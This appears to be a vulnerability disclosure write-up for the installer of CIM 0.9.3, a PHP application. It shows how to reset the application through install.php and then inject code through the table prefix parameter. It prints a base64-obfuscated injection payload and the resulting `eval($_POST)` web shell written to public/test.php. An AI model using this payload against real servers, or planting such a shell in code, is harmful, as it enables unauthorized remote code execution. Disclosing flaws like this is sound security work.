# Reload application
----------------------------
The location of the vulnerability is the installation file `\CIM\0.9.3_181222\public\install\install.php`
![](https://github.com/AvaterXXX/CVEs/blob/master/images/cim/cim_Information-Disclosure_1-1.png)

Only step1 is judged here. If you enter step2, you can skip case0 and go directly to case1.
![](https://github.com/AvaterXXX/CVEs/blob/master/images/cim/cim_Information-Disclosure_1-2.png)

Visit to `http://www.a.com/public/install/#/step3`
![](https://github.com/AvaterXXX/CVEs/blob/master/images/cim/cim_Information-Disclosure_1-3.png)

# GETSHELL
----------------------------
With the application reset and use, under normal circumstances, you can not access sensitive files under config, but you can access public, and when installing the system, there is no restriction on the user's input, as shown in the source code below.
![](https://github.com/AvaterXXX/CVEs/blob/master/images/CIM/cim_GETSHELL_1-1.png)
![](https://github.com/AvaterXXX/CVEs/blob/master/images/CIM/cim_GETSHELL_1-2.png)

You can see that the database is connected first, then the configuration file is written at the beginning of line 214, so we need to bypass the mechanism, because although the input is not filtered, we have a logic error here, on line 223. Instead of verifying that the table connections in the database are correct, we write the configuration file, so we grab the package view.
![](https://github.com/AvaterXXX/CVEs/blob/master/images/CIM/cim_GETSHELL_1-3.png)

When the parameter N=83, the data is written to the configuration file at this time, so we can construct the payload in the parameter prefix input.
```',@fputs(fopen(base64_decode('Li4vcHVibGljL3Rlc3QucGhw'),w), urldecode(base64_decode('JTNDJTNGcGhwJTIwQGV2YWwlMjglMjRfUE9TVCU1QiUyNzEyMyUyNyU1RCUyOSUzQiUzRiUzRQ=='))),'```
Just write test.php in the public directory of the root directory, the content is ```<?php @eval($_POST['123']);?>```
When the installation is complete, check the home page to generate the test.php file in the public directory.

![](https://github.com/AvaterXXX/CVEs/blob/master/images/CIM/cim_GETSHELL_1-4.png)
